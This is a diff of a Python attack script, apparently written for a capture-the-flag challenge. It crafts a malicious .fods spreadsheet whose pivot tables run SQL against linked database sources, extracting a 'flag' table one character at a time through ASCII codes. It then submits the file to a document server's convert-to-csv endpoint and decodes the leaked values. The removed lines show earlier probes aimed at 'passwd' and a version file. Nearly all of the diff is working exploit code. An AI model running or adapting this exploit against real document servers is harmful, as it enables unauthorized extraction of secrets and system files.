@@ -208,17 +208,71 @@ def print_saved(docid, query):
         print("\n=== SAVED_DOCUMENT ===\n" + raw.decode("utf-8", "replace"), flush=True)
 
 
+def pivot_definition(name, url, table, positions, target):
+    selects = [f'ASCII(SUBSTRING(C1,{i},1)) AS X{i}' for i in positions]
+    statement = f'SELECT {", ".join(selects)} FROM "{table}"'
+    fields = []
+    for i in positions:
+        selected = ' table:selected-page="force-cache"' if i == positions[0] else ''
+        fields.append(
+            f'<table:data-pilot-field table:source-field-name="X{i}" '
+            f'table:orientation="data" table:function="sum"{selected}/>'
+        )
+    return f'''<table:data-pilot-table table:name="{name}" table:target-range-address="{target}" table:show-filter-button="false" table:drill-down-on-double-click="false">
+<table:database-source-sql table:database-name="{html.escape(url, quote=True)}" table:sql-statement="{html.escape(statement, quote=True)}" table:parse-sql-statement="true"/>
+<table:data-pilot-field table:source-field-name="" table:is-data-layout-field="true" table:orientation="column"/>
+{''.join(fields)}
+</table:data-pilot-table>'''
+
+
+def make_pivot_fods(flag_url, control_url):
+    positions = list(range(1, 81))
+    rows = []
+    for i in positions:
+        formula = f'of:=GETPIVOTDATA("X{i}";[.Z100])'
+        control = ''
+        if i == 1:
+            control_formula = 'of:=GETPIVOTDATA("X1";[.Z200])'
+            control = f'<table:table-cell table:formula="{html.escape(control_formula, quote=True)}" office:value-type="float" office:value="0"/>'
+        rows.append(
+            f'<table:table-row><table:table-cell table:formula="{html.escape(formula, quote=True)}" '
+            f'office:value-type="float" office:value="0"/>{control}</table:table-row>'
+        )
+    pivots = (
+        pivot_definition('FlagPivot', flag_url, 'flag', positions, 'Sheet1.Z100:Sheet1.CV120')
+        + pivot_definition('ControlPivot', control_url, 'versionrc', [1], 'Sheet1.Z200:Sheet1.AA210')
+    )
+    return f'''<?xml version="1.0" encoding="UTF-8"?>
+<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:table="urn:oasis:names:tc:opendocument:xmlns:table:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:calcext="urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0" office:version="1.3" office:mimetype="application/vnd.oasis.opendocument.spreadsheet">
+<office:body><office:spreadsheet><table:table table:name="Sheet1">{''.join(rows)}</table:table>
+<table:data-pilot-tables>{pivots}</table:data-pilot-tables>
+</office:spreadsheet></office:body></office:document>'''.encode()
+
+
+def convert(data):
+    boundary = "----Arena" + uuid.uuid4().hex
+    body = (f'--{boundary}\r\nContent-Disposition: form-data; name="data"; filename="probe.fods"\r\nContent-Type: application/octet-stream\r\n\r\n'.encode() + data + f"\r\n--{boundary}--\r\n".encode())
+    status, _, raw, _ = req(
+        "/cool/convert-to/csv", "POST", body,
+        {"Content-Type": "multipart/form-data; boundary=" + boundary}, limit=5000000,
+    )
+    text = raw.decode("utf-8", "replace")
+    print("\n=== PIVOT_CSV STATUS", status, "===\n" + text, flush=True)
+    codes = []
+    for line in text.splitlines()[:80]:
+        first = line.split(',', 1)[0].strip().strip('"')
+        try:
+            codes.append(int(float(first)))
+        except ValueError:
+            codes.append(-1)
+    print("PIVOT_CODES", codes, flush=True)
+    decoded = ''.join(chr(n) if 0 < n < 128 else '?' for n in codes)
+    print("PIVOT_DECODED", decoded, flush=True)
+
+
 def main():
     req("/login", "POST", form={"email": EMAIL, "password": PASSWORD})
-    # d4/d5/d6 are the ODB documents uploaded by the previous probe.
-    sources = [
-        (source_url("d4"), "flag", "Sheet1.A1:Sheet1.A20"),
-        (source_url("d5"), "passwd", "Sheet1.C1:Sheet1.C60"),
-        (source_url("d6"), "versionrc", "Sheet1.E1:Sheet1.E20"),
-    ]
-    docid, token, query = create_payload("refresh.fods", make_fods(sources))
-    open_wait_save(docid, token)
-    print_saved(docid, query)
+    convert(make_pivot_fods(source_url("d4"), source_url("d6")))
 
 
 if __name__ == "__main__":
